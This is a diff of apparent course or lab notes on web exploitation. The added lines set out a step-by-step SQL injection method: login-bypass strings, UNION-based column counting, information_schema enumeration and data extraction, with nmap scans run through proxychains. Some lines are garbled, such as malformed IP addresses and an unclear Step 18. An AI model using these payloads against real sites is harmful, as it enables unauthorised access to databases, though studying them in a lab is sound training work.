@@ -52,7 +52,7 @@ Step 4. Perform nmap scans on targets to find attackers from linops
 
 Step 5. Perfrom enumeration on the found target IP on port 80
 
-Step 6. Change proxy settings on browser TODO: TAKE SCREENSHOTS OF HOW THE PROXY WEBSITES SHOULD LOOK LIKE!!!
+Step 6. Change proxy settings on browser ![Alt Text](images/proxy_settings.png)
 
 Step 7. Perform SQL injections http://ip.address/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1
         Or enter the information on the login page 
@@ -73,7 +73,62 @@ Step 15. From here you can run proxychains and nmap to find targets e.g. `studen
 
 Step 16. Check for enum scripts and netbios using `nmap –Pn – 192.192.6.6.NumFOndin14 -sV`  or `nmap –Pn – 192.6.6.NumFOndinin14 --script -enum`
 
-Step 17. Go to the http page and try and perfrom sql injection union selection reference table notes TODO: ASK INSTRUCTOR FOR A REVIEW ON THIS. 
+Step 17. Go to the http page and try and perfrom sql injection union selection reference table notes.
+
+NOTES: 
+
+    Site has a login page / url has an equal sign in it ⇒ SQL Injection
+        20.178
+        Basic SQL Commands: Web Exploitation - Day 2 :: Cyber Common Technical Core - Security & Exploitation Module -> https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.html#_demo_sql_commands_sql_demo_box?isPin=false
+
+        Finding Unsanitized Fields: 
+            1. Use NMAP script: proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
+            2. Use single quote: ' ⇒ Results in non-standard error/extraneous information
+        
+        Login Page:
+            Post Method: Try in both username and password: tom' or 1='1
+            
+            Doesn't work ⇒ switch to GET Method
+                - Open inspector
+                - Find POST statement for username and password
+                - Double-Click and change to GET
+                - In the username/password fields on the page, put: tom' or 1='1
+                - Alternate method: pass in truth statements to the URL on the php page: <URL>/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1
+        
+        Site Interaction (e.g., Page pulls data from database and returns to screen)
+            
+            Identify POST / GET with page source or inspector
+            Find the vulnerable POST method
+                - Use the option legitimately to see what happens
+                - Try a truth state with legitimate data (e.g., Ford' OR 1='1)
+                - Doesn't work? Iterate with other options (e.g., Audi' OR 1='1)
+            
+            Find the vulnerable GET method
+                - When you submit the GET request, the URL has a ?[var]=
+                    -> e.g., <URL>/uniondemo.php?Selection=2&Submit=Submit
+                - Look at how the variable works (integers or strings) then edit your truth statement accordingly
+                    -> If integer search method: no quotes (e.g., <URL>/uniondemo.php?Selection=2 OR 1=1)
+                    -> If string search method: quotes (e.g., <URL>/uniondemo.php?Selection=RAM' OR 1='1
+                - If it doesn't work, iterate on the selection
+            
+            - Validate the column layout
+                -> Validate the NUMBER of columns required (GET): <URL>/uniondemo.php?Selection=2 Union SELECT 1,2,3
+                -> Validate the NUMBER of columns required (POST): Audi' Union SELECT 1,2,3,4
+                -> OR Validate the NUMBER of columns required (POST): Audi' Union SELECT 1,2,3,4;#
+                -> Look at what values appear (if some columns don't show up)
+                -> Look to see if the columns are out of order
+                -> Keep incrementing until it fails to see how many columns
+            
+            Enumerate the Database
+                - Golden Statement (POST): Audi' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;
+                    -> add items to search to have enough columns
+                    -> May need to add # to the end of the golden statement
+                - Golden Statement (GET): <URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+                - DONT CLOSE TAB
+            
+            Pull Out Useful Information
+                - POST: Audi' UNION SELECT name,size FROM session.Tires
+                - GET: <URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car
 
 Step 18. Add kizao prd = numberi saba union select table_schema, column_name, table_name FROM information_schema.columns. pick.php?product=6 or 1=1
 
